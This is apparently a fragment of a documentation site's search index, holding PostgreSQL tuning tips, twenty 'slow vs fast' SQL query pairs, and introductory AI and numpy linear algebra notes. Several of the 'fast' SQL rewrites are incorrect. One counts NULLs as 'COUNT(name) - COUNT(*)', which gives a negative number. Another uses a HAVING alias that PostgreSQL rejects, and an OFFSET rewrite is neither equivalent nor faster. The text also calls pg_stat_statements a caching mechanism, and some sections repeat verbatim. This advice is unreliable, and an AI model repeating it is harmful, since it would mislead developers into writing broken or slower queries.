required.</p>"},{"location":"postgresql/tricks/#5-regular-maintenance","title":"5. Regular Maintenance","text":"<p>Regular maintenance activities like running <code>VACUUM</code>, <code>ANALYZE</code>, and <code>REINDEX</code> can help in keeping your database optimized. Set up autovacuum processes, so these tasks are done automatically.</p> <p>Example:</p> <pre><code>-- Adjust autovacuum settings for a particular table\nALTER TABLE t_test SET (autovacuum_vacuum_scale_factor = 0.05);\nALTER TABLE t_test SET (autovacuum_analyze_scale_factor = 0.025);\n</code></pre>"},{"location":"postgresql/tricks/#6-partitioning-large-tables","title":"6. Partitioning Large Tables","text":"<p>Partitioning can be particularly useful for tables with a large amount of data. It allows the data to be broken down into smaller, more manageable pieces, and can improve query performance.</p> <p>Example: Using range partitioning on a date column:</p> <pre><code>CREATE TABLE t_orders (\n    order_id int,\n    order_date date,\n    ...\n) PARTITION BY RANGE (order_date);\n\nCREATE TABLE t_orders_2022 PARTITION OF t_orders FOR VALUES FROM ('2022-01-01') TO ('2023-01-01');\nCREATE TABLE t_orders_2023 PARTITION OF t_orders FOR VALUES FROM ('2023-01-01') TO ('2024-01-01');\n</code></pre>"},{"location":"postgresql/tricks/#7-using-connection-pooling","title":"7. Using Connection Pooling","text":"<p>Maintaining a large number of connections can be resource-intensive. Connection pooling can be a solution to manage connections and reduce overhead.</p> <p>Tip: Consider using <code>pgBouncer</code> or similar tools for connection pooling.</p>"},{"location":"postgresql/tricks/#8-offload-read-queries","title":"8. Offload Read Queries","text":"<p>If you have read-intensive workloads, consider using read replicas. They can offload the main database and lead to faster query executions.</p>"},{"location":"postgresql/tricks/#9-efficient-use-of-json-data","title":"9. Efficient Use of JSON Data","text":"<p>PostgreSQL has robust support for JSON and JSONB data types. Using the right functions and operators can help in optimizing queries on JSON data.</p> <p>Example: Create an index on a JSONB column:</p> <pre><code>CREATE INDEX idx_jsonb_data ON t_test USING gin(data jsonb_path_ops);\n</code></pre>"},{"location":"postgresql/tricks/#10-caching-strategy","title":"10. Caching Strategy","text":"<p>The effective use of caching mechanisms like <code>pg_stat_statements</code> can help in identifying and optimizing frequently executed queries.</p> <p>Example: To view the most frequently executed queries:</p> <pre><code>SELECT * FROM pg_stat_statements ORDER BY calls DESC;\n</code></pre>"},{"location":"postgresql/tricks/#11-use-materialized-views","title":"11. Use Materialized Views","text":"<p>Materialized views are a way to cache the result of a query physically and can be refreshed periodically. They can improve performance for repetitive and complex queries.</p> <p>Example:</p> <pre><code>CREATE MATERIALIZED VIEW mat_view_sales AS \nSELECT product_id, SUM(sales) \nFROM sales_data \nGROUP BY product_id;\n\n-- Refresh the view periodically\nREFRESH MATERIALIZED VIEW mat_view_sales;\n</code></pre>"},{"location":"postgresql/tricks/#12-monitoring-and-logging","title":"12. Monitoring and Logging","text":"<p>Keeping an eye on the logs and using tools like <code>pg_stat_activity</code> and <code>pgBadger</code> can provide insights into slow queries and other performance issues.</p>"},{"location":"postgresql/tricks/#more-tricks","title":"More Tricks","text":"<p>Slow Query 1: <pre><code>SELECT developper.name\nFROM developper\nLEFT JOIN talent ON developper.id = talent.foreign_id\nWHERE talent.id IS NULL;\n</code></pre></p> <p>Fast Query 1: <pre><code>SELECT developper.name\nFROM developper\nWHERE NOT EXISTS (SELECT 1 FROM talent WHERE developper.id = talent.foreign_id);\n</code></pre></p> <p>Slow Query 2: <pre><code>SELECT DISTINCT developper.name\nFROM developper, project\nWHERE developper.id = project.developer_id;\n</code></pre></p> <p>Fast Query 2: <pre><code>SELECT developper.name\nFROM developper\nJOIN project ON developper.id = project.developer_id;\n</code></pre></p> <p>Slow Query 3: <pre><code>SELECT * \nFROM developper\nORDER BY name DESC \nLIMIT 10;\n</code></pre></p> <p>Fast Query 3: <pre><code>SELECT * \nFROM developper \nORDER BY name \nLIMIT 10 OFFSET (SELECT COUNT(*) - 10 FROM developper);\n</code></pre></p> <p>Slow Query 4: <pre><code>SELECT developper.name\nFROM developper\nWHERE age &gt;= 20 AND age &lt;= 30;\n</code></pre></p> <p>Fast Query 4: <pre><code>SELECT developper.name\nFROM developper\nWHERE age BETWEEN 20 AND 30;\n</code></pre></p> <p>Slow Query 5: <pre><code>SELECT COUNT(*)\nFROM developper\nWHERE name IS NULL;\n</code></pre></p> <p>Fast Query 5: <pre><code>SELECT COUNT(name) - COUNT(*)\nFROM developper;\n</code></pre></p> <p>Slow Query 6: <pre><code>SELECT developper.name\nFROM developper\nWHERE name LIKE 'John%';\n</code></pre></p> <p>Fast Query 6: <pre><code>SELECT developper.name\nFROM developper\nWHERE name &gt;= 'John' AND name &lt; 'Joho';\n</code></pre></p> <p>Slow Query 7: <pre><code>SELECT *\nFROM developper\nWHERE id IN (SELECT developer_id FROM project WHERE status = 'completed');\n</code></pre></p> <p>Fast Query 7: <pre><code>SELECT developper.*\nFROM developper\nJOIN project ON developper.id = project.developer_id\nWHERE project.status = 'completed';\n</code></pre></p> <p>Slow Query 8: <pre><code>SELECT SUM(salary)\nFROM developper\nGROUP BY department_id\nHAVING SUM(salary) &gt; 10000;\n</code></pre></p> <p>Fast Query 8: <pre><code>SELECT department_id, SUM(salary) as total_salary\nFROM developper\nGROUP BY department_id\nHAVING total_salary &gt; 10000;\n</code></pre></p> <p>Slow Query 9: <pre><code>SELECT developper.name\nFROM developper, project\nWHERE developper.id = project.developer_id AND project.status = 'active';\n</code></pre></p> <p>Fast Query 9: <pre><code>SELECT developper.name\nFROM developper\nJOIN project ON developper.id = project.developer_id\nWHERE project.status = 'active';\n</code></pre></p> <p>Slow Query 10: <pre><code>SELECT developper.name\nFROM developper\nLEFT JOIN project ON developper.id = project.developer_id\nWHERE project.id IS NULL;\n</code></pre></p> <p>Fast Query 10: <pre><code>SELECT developper.name\nFROM developper\nWHERE NOT EXISTS (SELECT 1 FROM project WHERE developper.id = project.developer_id);\n</code></pre></p> <p>Slow Query 11: <pre><code>SELECT developper.name\nFROM developper\nWHERE UPPER(name) = 'JOHN';\n</code></pre></p> <p>Fast Query 11: <pre><code>-- Assuming there is an index on the `name` column.\nSELECT developper.name\nFROM developper\nWHERE name = 'John';\n</code></pre></p> <p>Slow Query 12: <pre><code>SELECT name, SUM(salary) \nFROM developper\nGROUP BY name\nORDER BY SUM(salary) DESC;\n</code></pre></p> <p>Fast Query 12: <pre><code>-- Use an alias to avoid computing SUM(salary) twice.\nSELECT name, SUM(salary) as total_salary \nFROM developper\nGROUP BY name\nORDER BY total_salary DESC;\n</code></pre></p> <p>Slow Query 13: <pre><code>SELECT developper.name\nFROM developper, skills\nWHERE developper.id = skills.developer_id AND skills.name = 'Python';\n</code></pre></p> <p>Fast Query 13: <pre><code>SELECT developper.name\nFROM developper\nJOIN skills ON developper.id = skills.developer_id\nWHERE skills.name = 'Python';\n</code></pre></p> <p>Slow Query 14: <pre><code>SELECT developper.name\nFROM developper\nWHERE id IN (SELECT developer_id FROM project WHERE status NOT IN ('completed', 'active'));\n</code></pre></p> <p>Fast Query 14: <pre><code>SELECT developper.name\nFROM developper\nJOIN project ON developper.id = project.developer_id\nWHERE project.status NOT IN ('completed', 'active');\n</code></pre></p> <p>Slow Query 15: <pre><code>SELECT developper.name\nFROM developper\nLEFT JOIN project ON developper.id = project.developer_id\nWHERE project.name IS NULL;\n</code></pre></p> <p>Fast Query 15: <pre><code>SELECT developper.name\nFROM developper\nWHERE NOT EXISTS (SELECT 1 FROM project WHERE developper.id = project.developer_id);\n</code></pre></p> <p>Slow Query 16: <pre><code>SELECT developper.name, COUNT(project.id)\nFROM developper, project\nWHERE developper.id = project.developer_id\nGROUP BY developper.name;\n</code></pre></p> <p>Fast Query 16: <pre><code>SELECT developper.name, COUNT(project.id)\nFROM developper\nJOIN project ON developper.id = project.developer_id\nGROUP BY developper.name;\n</code></pre></p> <p>Slow Query 17: <pre><code>SELECT developper.name\nFROM developper\nWHERE CHAR_LENGTH(name) &gt; 5;\n</code></pre></p> <p>Fast Query 17: <pre><code>-- Assuming there is an index on the `name` column.\nSELECT developper.name\nFROM developper\nWHERE LENGTH(name) &gt; 5;\n</code></pre></p> <p>Slow Query 18: <pre><code>SELECT developper.name\nFROM developper, project\nWHERE developper.id = project.developer_id AND project.status LIKE 'act%';\n</code></pre></p> <p>Fast Query 18: <pre><code>SELECT developper.name\nFROM developper\nJOIN project ON developper.id = project.developer_id\nWHERE project.status LIKE 'act%';\n</code></pre></p> <p>Slow Query 19: <pre><code>SELECT developper.name\nFROM developper\nWHERE age &gt; 20\nORDER BY age;\n</code></pre></p> <p>Fast Query 19: <pre><code>-- If there's an index on age, this will be faster.\nSELECT developper.name\nFROM developper\nWHERE age &gt; 20\nORDER BY age ASC;\n</code></pre></p> <p>Slow Query 20: <pre><code>SELECT developper.name\nFROM developper\nWHERE name &lt;&gt; '';\n</code></pre></p> <p>Fast Query 20: <pre><code>SELECT developper.name\nFROM developper\nWHERE name IS NOT NULL AND name != '';\n</code></pre></p>"},{"location":"programming/ai/","title":"Introduction to AI and its Subfields","text":"<p>Artificial Intelligence (AI) has become a cornerstone of modern technology and is shaping the future of numerous industries such as healthcare, finance, entertainment, and transportation. In this section, we'll delve into the history and evolution of AI and explore its various subfields.</p>"},{"location":"programming/ai/#history-and-evolution-of-ai","title":"History and Evolution of AI","text":"<p>The concept of AI isn't new. It dates back to ancient times, where myths and stories talked about artificial beings endowed with intelligence. However, the real pursuit of AI began in the mid-20th century.</p> <p>John McCarthy, widely known as the \"father of AI\", coined the term 'Artificial Intelligence' in 1956. Early AI research focused on problem-solving and symbolic methods. It wasn't until the 1990s and 2000s, with the advent of machine learning and subsequently deep learning, that we've seen the explosion of AI applications we have today.</p>"},{"location":"programming/ai/#subfields-of-ai","title":"Subfields of AI","text":"<p>Artificial Intelligence is a broad field and comprises several subfields. Here are a few key ones:</p>"},{"location":"programming/ai/#machine-learning-ml","title":"Machine Learning (ML)","text":"<p>Machine learning is a subset of AI that gives computers the ability to learn without being explicitly programmed. This learning is achieved by training algorithms on data. Machine learning includes various techniques like linear regression, decision trees, and support vector machines.</p>"},{"location":"programming/ai/#deep-learning-dl","title":"Deep Learning (DL)","text":"<p>Deep Learning is a subset of machine learning that uses artificial neural networks with several layers (hence the term \"deep\"). These models are inspired by the human brain and are designed to replicate the way humans learn.</p>"},{"location":"programming/ai/#natural-language-processing-nlp","title":"Natural Language Processing (NLP)","text":"<p>NLP is a subfield of AI that focuses on the interaction between computers and humans through language. It involves several tasks, including language translation, sentiment analysis, and speech recognition.</p>"},{"location":"programming/ai/#reinforcement-learning-rl","title":"Reinforcement Learning (RL)","text":"<p>Reinforcement Learning is a type of machine learning where an agent learns to make decisions by taking actions in an environment to achieve a goal. The agent learns from the consequences of its actions, rather than from being taught explicitly.</p> <p>In the upcoming sections, we will explore these topics in depth, providing you with a comprehensive understanding of each field and how they contribute to the larger AI landscape.</p>"},{"location":"programming/ai/#mathematical-foundations","title":"Mathematical Foundations","text":"<p>Before we delve deep into AI and Machine Learning, it's crucial to understand the mathematical foundations that form the basis of these technologies. This section will help you revise some basics and learn new concepts in linear algebra, probability, statistics, and calculus. No worries if you haven't done math for a while, we'll start with the basics and gradually progress to more advanced topics.</p>"},{"location":"programming/ai/#linear-algebra","title":"Linear Algebra","text":"<p>Linear algebra is fundamental in the field of machine learning. Concepts like vectors, matrices, and tensors form the data structures in machine learning, while operations such as dot product, matrix multiplication, and eigendecomposition are essential for understanding how machine learning algorithms work.</p>"},{"location":"programming/ai/#vectors-matrices-and-tensors","title":"Vectors, Matrices, and Tensors","text":"<p>Vectors are a sequence of numbers, matrices are 2D arrays of numbers, and tensors are n-dimensional arrays with n&gt;2. In Python, you can create vectors, matrices, and tensors using the numpy library.</p> <pre><code>import numpy as np\n\n# Creating a vector\nv = np.array([1, 2, 3])\nprint(\"Vector:\\n\", v)\n\n# Creating a matrix\nm = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])\nprint(\"Matrix:\\n\", m)\n\n# Creating a tensor\nt = np.array([[[1, 2, 3], [4, 5, 6], [7, 8, 9]],\n              [[10, 11, 12], [13, 14, 15], [16, 17, 18]],\n              [[19, 20, 21], [22, 23, 24], [25, 26, 27]]])\nprint(\"Tensor:\\n\", t)\n</code></pre> <p>(Note: More advanced linear algebra topics will be continued...)</p>"},{"location":"programming/ai/#probability-and-statistics","title":"Probability and Statistics","text":"<p>Probability theory is the mathematical foundation of statistical machine learning. Concepts like random variables, probability distributions, expectation, and variance give us the tools to model the uncertainty inherent in machine learning algorithms.</p> <p>Statistics is the discipline that allows us to make inferences and decisions under uncertainty. Descriptive statistics summarize and organize characteristics of a data set. Inferential statistics, on the other hand, allow us to make inferences and predictions based on data.</p> <p>(Note: More advanced probability and statistics topics will be continued...)</p>"},{"location":"programming/ai/#calculus","title":"Calculus","text":"<p>Calculus, especially differential calculus, plays a vital role in machine learning. Many machine learning algorithms involve optimization. To find the optimal solution, we need to understand concepts like derivatives and gradients.</p> <p>(Note: More advanced calculus topics will be continued...)</p> <p>This concludes the introduction to mathematical foundations for AI. The upcoming sections will dive deeper into each of these areas, equipping you with the necessary mathematical knowledge to excel in AI.</p>"},{"location":"programming/ai/#introduction-to-deep-learning","title":"Introduction to Deep Learning","text":"<p>Deep Learning is a subset of machine learning that makes the computation of complex functions feasible by using artificial neural networks with many layers (hence the term \"deep\"). These methods have dramatically improved the state-of-the-art in fields like image recognition and speech recognition.</p>"},{"location":"programming/ai/#concept-of-artificial-neural-networks","title":"Concept of Artificial Neural Networks","text":"<p>The fundamental building block of deep learning is the artificial neural network. These networks are inspired by the structure of the human brain, where interconnected neurons work together to process and learn from information.</p> <p>A neural network consists of layers of nodes, where each node in a layer is connected to all nodes in the previous and next layers. Each connection has a weight, which the network adjusts during learning to minimize the difference between its predictions and actual values.</p> <pre><code># A simple example of creating a neural network using the keras library\nfrom tensorflow.keras.models import Sequential\nfrom tensorflow.keras.layers import Dense\n\n# Initialize the constructor\nmodel = Sequential()\n\n# Add an input layer \nmodel.add(Dense(12, activation='relu', input_shape=(10,)))\n\n# Add one hidden layer \nmodel.add(Dense(8, activation='relu'))\n\n# Add an output layer \nmodel.add(Dense(1, activation='sigmoid'))\n</code></pre>"},{"location":"programming/ai/#forward-propagation-and-backpropagation","title":"Forward Propagation and Backpropagation","text":"<p>Forward propagation is the process by which the neural network generates predictions. It starts from the input layer and moves through the hidden layers, applying the weights and activation functions, until it reaches the output layer.</p> <p>Backpropagation, on the other hand, is the method used to update the weights in the neural network. After forward propagation, the network calculates the error between its prediction and the actual value. This error is then propagated backward through the network, adjusting the weights along the way.</p> <p>(Note: More detailed explanation on forward propagation and backpropagation will be continued...)</p>"},{"location":"programming/ai/#types-of-neural-networks","title":"Types of Neural Networks","text":"<p>There are several types of neural networks used in deep learning, including:</p>"},{"location":"programming/ai/#multi-layer-perceptrons-mlp","title":"Multi-Layer Perceptrons (MLP)","text":"<p>MLP, also known as vanilla neural networks, are the simplest form of artificial neural network. They consist of at least three layers: an input layer, an output layer, and one or more hidden layers.</p>"},{"location":"programming/ai/#convolutional-neural-networks-cnn","title":"Convolutional Neural Networks (CNN)","text":"<p>CNNs are primarily used for image processing, pattern recognition, and image classification. They consist of convolutional and pooling layers, followed by fully connected layers.</p>"},{"location":"programming/ai/#recurrent-neural-networks-rnn","title":"Recurrent Neural Networks (RNN)","text":"<p>RNNs are designed to recognize patterns in sequences of data, such as text, genomes, handwriting, or the spoken word. Unlike traditional neural networks, RNNs have \"memory\" in the sense that information cycles through a loop, allowing information to persist.</p>"},{"location":"programming/ai/#long-short-term-memory-lstm","title":"Long Short-Term Memory (LSTM)","text":"<p>LSTMs are a special kind of RNN that are capable of learning long-term dependencies. They're widely used in tasks that require remembering information for long periods.</p> <p>(Note: More detailed information on types of neural networks will be continued...)</p>"},{"location":"programming/ai/#training-deep-learning-models","title":"Training Deep Learning Models","text":"<p>Training a deep learning model involves feeding data through the network (forward propagation), calculating the error, and then adjusting the weights to minimize this error (backpropagation). This process is repeated for a number of iterations or until the model's performance is satisfactory.</p> <p>(Note: More advanced topics on training deep learning models will be continued...)</p> <p>This concludes the introduction to deep learning. The subsequent sections will elaborate more on these topics, allowing you to understand and apply deep learning techniques effectively.</p>"},{"location":"programming/ai/#specific-deep-learning-architectures","title":"Specific Deep Learning Architectures","text":"<p>In deep learning, different architectures of neural networks are suitable for different types of tasks. In this section, we'll explore a few significant deep learning architectures including CNNs, Transformers, and GANs.</p>"},{"location":"programming/ai/#cnn-architectures","title":"CNN Architectures","text":"<p>Convolutional Neural Networks (CNNs) have been instrumental in the field of computer vision. Over the years, researchers have proposed numerous CNN architectures. Let's look at a few:</p>"},{"location":"programming/ai/#resnet-residual-network","title":"ResNet (Residual Network)","text":"<p>ResNet, introduced by Microsoft, is famous for its \"skip connection\" feature, allowing it to have over a hundred layers without suffering from the vanishing gradient problem.</p>"},{"location":"programming/ai/#vgg-visual-geometry-group","title":"VGG (Visual Geometry Group)","text":"<p>VGG, developed by the Visual Geometry Group at Oxford, is known for its uniform architecture. It's straightforward and great at generalization but it's also resource-heavy.</p>"},{"location":"programming/ai/#inception","title":"Inception","text":"<p>The Inception network, also known as GoogLeNet, was developed by researchers at Google. It introduced the inception module, a building block that, among other things, allows for more efficient computation and deeper networks.</p> <p>(Note: More detailed explanation on CNN architectures will be continued...)</p>"},{"location":"programming/ai/#transformer-model","title":"Transformer Model","text":"<p>The Transformer model, introduced in the paper \"Attention is All You Need\", is a type of neural network architecture primarily used in the field of natural language processing (NLP). Unlike traditional recurrent neural networks, Transformer models handle variable-length input using only attention mechanisms, leading to more parallelizable computation.</p> <p>(Note: More detailed explanation on Transformer model will be continued...)</p>"},{"location":"programming/ai/#generative-adversarial-networks-gans","title":"Generative Adversarial Networks (GANs)","text":"<p>Generative Adversarial Networks (GANs) are a class of AI algorithms used in unsupervised machine learning, which involves two neural networks competing against each other. GANs can generate new data that follows the same patterns as the training set. This feature makes them useful in a variety of applications, including image synthesis, semantic image editing, style transfer, and image super-resolution.</p> <p>(Note: More detailed explanation on GANs will be continued...)</p> <p>The architectures mentioned above have led to substantial improvements in tasks such as image recognition, object detection, and language understanding. The upcoming sections will delve deeper into these architectures, helping you understand the inner workings and how to implement them.</p>"},{"location":"programming/ai/#natural-language-processing","title":"Natural Language Processing","text":"<p>Natural Language Processing (NLP) is a branch of AI that helps computers understand, interpret and manipulate human language. This section will introduce you to the basics of NLP and various text representation techniques, as well as more advanced NLP models and techniques.</p>"},{"location":"programming/ai/#basics-of-nlp-and-text-representation-techniques","title":"Basics of NLP and Text Representation Techniques","text":"<p>Processing natural language data involves several steps, starting from basic tokenization to complex parsing and semantic analysis. After processing, we often need to represent the text in a form that can be input to a machine learning or deep learning model.</p>"},{"location":"programming/ai/#bag-of-words","title":"Bag of Words","text":"<p>Bag of Words (BoW) is a simple and commonly used way to represent text for use in machine learning, which ignores syntax and even word order, but is effective for several tasks.</p>"},{"location":"programming/ai/#tf-idf","title":"TF-IDF","text":"<p>Term Frequency-Inverse Document Frequency (TF-IDF) is another way to represent text. It gives more weight to the more important words (i.e., words that are frequent in a document but not across documents).</p>"},{"location":"programming/ai/#word-embeddings","title":"Word Embeddings","text":"<p>Word Embeddings are dense vector representations where words with similar meanings are mapped to similar vectors.</p> <p>(Note: More advanced topics on text representation techniques will be continued...)</p>"},{"location":"programming/ai/#advanced-nlp-models-and-techniques","title":"Advanced NLP Models and Techniques","text":""},{"location":"programming/ai/#rnns-and-lstms","title":"RNNs and LSTMs","text":"<p>Recurrent Neural Networks (RNNs) and Long Short-Term Memory (LSTM) networks are effective for tasks involving sequential data, and they have been widely used in NLP for tasks such as text generation, sentiment analysis, and machine translation.</p>"},{"location":"programming/ai/#transformer-model_1","title":"Transformer Model","text":"<p>The Transformer model, as previously discussed, is a type of architecture that uses self-attention mechanisms and has become the go-to model for many NLP tasks.</p>"},{"location":"programming/ai/#language-models-like-gpt-and-bert","title":"Language Models like GPT and BERT","text":"<p>GPT (Generative Pre-trained Transformer) and BERT (Bidirectional Encoder Representations from Transformers) are large language models that have achieved state-of-the-art results on a variety of NLP tasks.</p> <p>(Note: More detailed topics on advanced NLP models and techniques will be continued...)</p> <p>This concludes the introduction to Natural Language Processing. The following sections will dive deeper into these areas, equipping you with the knowledge and skills needed to tackle various NLP tasks.</p>"},{"location":"programming/ai/#reinforcement-learning","title":"Reinforcement Learning","text":"<p>Reinforcement Learning (RL) is an aspect of machine learning where an agent learns to behave in an environment, by performing certain actions and observing the results/rewards of those actions. This section will introduce key concepts in reinforcement learning and some fundamental algorithms.</p>"},{"location":"programming/ai/#concepts-of-agents-environment-states-actions-and-rewards","title":"Concepts of Agents, Environment, States, Actions, and Rewards","text":"<p>In RL, an agent takes actions in an environment to achieve a goal. The environment presents a state to the agent, the agent takes action based on this state, and then the environment presents a new state and a reward to the agent. The agent's objective is to learn to take actions that maximize the cumulative reward over time.</p> <pre><code># An illustrative example using OpenAI's gym library.\nimport gym\n\n# Create the environment\nenv = gym.make('CartPole-v1')\n\n# Initialize state\nstate = env.reset()\n\nfor t in range(1000):\n    env.render()  # You can visualize the environment using render\n    action = env.action_space.sample()  # Here we're just sampling random actions\n    state, reward, done, info = env.step(action)  # The agent takes a step in the environment\n    if done:\n        print(\"Episode finished after {} timesteps\".format(t+1))\n        break\n</code></pre>"},{"location":"programming/ai/#model-based-vs-model-free-reinforcement-learning","title":"Model-Based vs Model-Free Reinforcement Learning","text":"<p>In model-based RL, the agent has a model of the environment, i.e., it knows or learns the probabilities of landing in any state given the current state and action. In model-free RL, the agent doesn't have this knowledge and must learn entirely from trial-and-error.</p>"},{"location":"programming/ai/#algorithms-q-learning-sarsa-and-dqn","title":"Algorithms: Q-Learning, SARSA, and DQN","text":"<p>There are various algorithms for implementing reinforcement learning. Q-Learning and SARSA (State-Action-Reward-State-Action) are fundamental model-free methods that learn the value of taking each action in each state. Deep Q-Network (DQN) extends Q-Learning to large state-action spaces by using neural networks to approximate the Q-function.</p> <p>(Note: More detailed topics on RL algorithms will be continued...)</p> <p>This introduction provides a glimpse into the fascinating world of Reinforcement Learning. Subsequent sections will elaborate further on these topics, providing a deeper understanding and practical applications of various RL techniques.</p>"},{"location":"programming/ai/#calculus-extended","title":"CALCULUS EXTENDED","text":""},{"location":"programming/ai/#dot-product","title":"Dot Product","text":"<p>The dot product, or scalar product, is an algebraic operation that takes two equal-length sequences of numbers (usually coordinate vectors) and returns a single number. It is an essential operation in machine learning as it measures the similarity between vectors.</p> <p>In Python, you can compute the dot product between two vectors using the <code>numpy.dot()</code> function:</p> <pre><code>import numpy as np\n\n# Define two vectors\nv1 = np.array([1, 2, 3])\nv2 = np.array([4, 5, 6])\n\n# Compute the dot product\ndot_product = np.dot(v1, v2)\nprint(\"Dot Product:\\n\", dot_product)\n</code></pre>"},{"location":"programming/ai/#matrix-multiplication","title":"Matrix Multiplication","text":"<p>Matrix multiplication, also known as the matrix dot product, is a binary operation that produces a matrix from two matrices. It's a fundamental operation in machine learning and deep learning, often used for transforming data, training models, and more.</p> <p>In Python, you can compute the matrix multiplication between two matrices using the <code>numpy.matmul()</code> or <code>numpy.dot()</code> function:</p> <pre><code>import numpy as np\n\n# Define two matrices\nm1 = np.array([[1, 2], [3, 4]])\nm2 = np.array([[5, 6], [7, 8]])\n\n# Compute the matrix multiplication\nmat_mul = np.matmul(m1, m2)\nprint(\"Matrix Multiplication:\\n\", mat_mul)\n</code></pre>"},{"location":"programming/ai/#eigendecomposition","title":"Eigendecomposition","text":"<p>Eigendecomposition is the factorization of a matrix into a canonical form, whereby the matrix is represented in terms of its eigenvalues and eigenvectors. Only diagonalizable matrices can be factorized in this way. This is a common operation used for dimensionality reduction techniques like PCA.</p> <p>In Python, you can perform the eigendecomposition of a matrix using the <code>numpy.linalg.eig()</code> function:</p> <pre><code>import numpy as np\n\n# Define a matrix\nm = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])\n\n# Compute the eigendecomposition\neigenvalues, eigenvectors = np.linalg.eig(m)\nprint(\"Eigenvalues:\\n\", eigenvalues)\nprint(\"Eigenvectors:\\n\", eigenvectors)\n</code></pre>"},{"location":"programming/ai/#vectormatrix-norms","title":"Vector/Matrix Norms","text":"<p>A vector norm is a measure of the \"length\" of a vector. For a matrix, the norm is a measure of \"magnitude\". The most common norm, often simply called \"the norm\" of a vector, is the L2 norm or Euclidean norm.</p> <p>In Python, you can calculate the norm of a vector or matrix using the <code>numpy.linalg.norm()</code> function:</p> <pre><code>import numpy as np\n\n# Define a vector and a matrix\nv = np.array([1, 2, 3])\nm = np.array([[1, 2], [3, 4]])\n\n# Compute the L2 norm (Euclidean norm)\nv_norm = np.linalg.norm(v)\nm_norm = np.linalg.norm(m)\nprint(\"Vector L2 norm:\\n\", v_norm)\nprint(\"Matrix Frobenius norm:\\n\", m_norm)\n</code></pre>"},{"location":"programming/ai/#inverse-of-a-matrix","title":"Inverse of a Matrix","text":"<p>The inverse of a matrix A is a matrix denoted as A^-1, such that when A is multiplied by A^-1 the result is the identity matrix I. Not all matrices have an inverse. This concept is crucial for solving systems of linear equations.</p> <p>In Python, you can compute the inverse of a matrix using the <code>numpy.linalg.inv()</code> function:</p> <pre><code>import numpy as np\n\n# Define a matrix\nm = np.array([[4, 7], [2, 6]])\n\n# Compute the inverse of the matrix\nm_inv = np.linalg.inv(m)\nprint(\"Inverse of Matrix:\\n\", m_inv)\n</code></pre>"},{"location":"programming/ai/#singular-value-decomposition-svd","title":"Singular Value Decomposition (SVD)","text":"<p>SVD is a factorization of a real or complex matrix. It has many practical applications in signal processing and statistics. In machine learning, it's often used for dimensionality reduction, noise reduction, and recommendation systems.</p> <p>In Python, you can perform the SVD of a matrix using the <code>numpy.linalg.svd()</code> function:</p> <pre><code>import numpy as np\n\n# Define a matrix\nm = np.array([[1, 2], [3, 4], [5, 6]])\n\n# Compute the Singular Value Decomposition\nU, S, VT = np.linalg.svd(m)\nprint(\"U:\\n\", U)\nprint(\"S:\\n\", S)\nprint(\"VT:\\n\", VT)\n</code></pre>"},{"location":"programming/ai/#vectormatrix-norms_1","title":"Vector/Matrix Norms","text":"<p>A vector norm is a measure of the \"length\" of a vector. For a matrix, the norm is a measure of \"magnitude\". The most common norm, often simply called \"the norm\" of a vector, is the L2 norm or Euclidean norm.</p> <p>In Python, you can calculate the norm of a vector or matrix using the <code>numpy.linalg.norm()</code> function:</p> <pre><code>import numpy as np\n\n# Define a vector and a matrix\nv = np.array([1, 2, 3])\nm = np.array([[1, 2], [3, 4]])\n\n# Compute the L2 norm (Euclidean norm)\nv_norm = np.linalg.norm(v)\nm_norm = np.linalg.norm(m)\nprint(\"Vector L2 norm:\\n\", v_norm)\nprint(\"Matrix Frobenius norm:\\n\", m_norm)\n</code></pre>"},{"location":"programming/ai/#inverse-of-a-matrix_1","title":"Inverse of a Matrix","text":"<p>The inverse of a matrix A is a matrix denoted as A^-1, such that when A is multiplied by A^-1 the result is the identity matrix I. Not all matrices have an inverse. This concept is crucial for solving systems of linear equations.</p> <p>In Python, you can compute the inverse of a matrix using the <code>numpy.linalg.inv()</code> function:</p> <pre><code>import numpy as np\n\n# Define a matrix\nm = np.array([[4, 7], [2, 6]])\n\n# Compute the inverse of the matrix\nm_inv = np.linalg.inv(m)\nprint(\"Inverse of Matrix:\\n\", m_inv)\n</code></pre>"},{"location":"programming/ai/#singular-value-decomposition-svd_1","title":"Singular Value Decomposition (SVD)","text":"<p>SVD is a factorization of a real or complex matrix. It has many practical applications in signal processing and statistics. In machine learning, it's often used for dimensionality reduction, noise reduction, and recommendation systems.</p> <p>In Python, you can perform the SVD of a matrix using the <code>numpy.linalg.svd()</code> function:</p> <pre><code>import numpy as np\n\n# Define a matrix\nm = np.array([[1, 2], [3, 4], [5, 6]])\n\n# Compute the Singular Value Decomposition\nU, S, VT = np.linalg.svd(m)\nprint(\"U:\\n\", U)\nprint(\"S:\\n\", S)\nprint(\"VT:\\n\", VT)\n</code></pre>"},{"location":"programming/ai/#orthogonal-vectors-and-matrices","title":"Orthogonal Vectors and Matrices","text":"<p>Two vectors are orthogonal to each other if their dot product equals zero. An orthogonal matrix is a square matrix whose columns and rows are orthogonal unit vectors (i.e., orthonormal vectors).</p> <p>In Python, you can check the orthogonality of two vectors or matrices:</p> <pre><code>import numpy as np\n\n# Define two orthogonal vectors\nv1 = np.array([0, 1])\nv2 = np.array([1, 0])\n\n# Their dot product should be zero\nprint(\"Dot Product:\\n\", np.dot(v1, v2))\n\n# Define an orthogonal matrix\nQ = np.array([[1, 0], [0, -1]])\n\n# Its transpose should be equal to its inverse\nprint(\"Q Transpose equals Q Inverse:\\n\", np.allclose(Q.T, np.linalg.inv(Q)))\n</code></pre>"},{"location":"programming/ai/#rank-of-a-matrix","title":"Rank of a Matrix","text":"<p>The rank of a matrix is the maximum number of linearly independent column vectors in the matrix. It's a fundamental concept in linear algebra, giving the dimension of the vector space generated (or spanned) by its columns.</p> <p>In Python, you can calculate the rank of a matrix using the <code>numpy.linalg.matrix_rank()</code> function:</p> <pre><code>import numpy as np\n\n# Define a matrix\nm = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])\n\n# Compute the rank of the matrix\nrank = np.linalg.matrix_rank(m)\nprint(\"Rank of Matrix:\\n\", rank)\n</code></pre>"},{"location":"programming/ai/#trace-of-a-matrix","title":"Trace of a Matrix","text":"<p>The trace of an n-by-n square matrix A is the sum of the elements on the main diagonal. The trace of a matrix is invariant under rotation (i.e., it remains the same if the matrix is rotated).</p> <p>In Python, you can calculate the trace of a matrix using the <code>numpy.trace()</code> function:</p> <pre><code>import numpy as np\n\n# Define a matrix\nm = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])\n\n# Compute the trace of the matrix\ntrace = np.trace(m)\nprint(\"Trace 